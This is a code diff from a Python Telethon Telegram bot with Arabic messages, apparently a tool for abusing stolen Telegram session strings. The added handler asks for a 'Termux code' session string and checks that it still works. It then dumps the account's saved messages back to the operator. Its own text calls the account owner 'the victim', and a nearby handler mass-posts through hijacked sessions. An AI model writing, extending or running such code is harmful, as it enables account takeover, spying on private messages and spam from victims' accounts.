@@ -738,11 +738,16 @@ async def users(event):
       i = await gcastc(strses.text, msg.text)
       await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"V")))
+
 async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        strses = await x.send_message("Fetching saved messages...")
-        saved_msgs = await savedmsgs(strses.text)
-        if saved_msgs:
-            await x.send_message(f"Saved Messages:\n\n{''.join(saved_msgs)}")
-        else:
-            await x.send_message("No saved messages found.")
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("الان ارسل الكود تيرمكس")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      i = await savedmsgs(strses.text)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس الساحر", buttons=keyboard)
+    
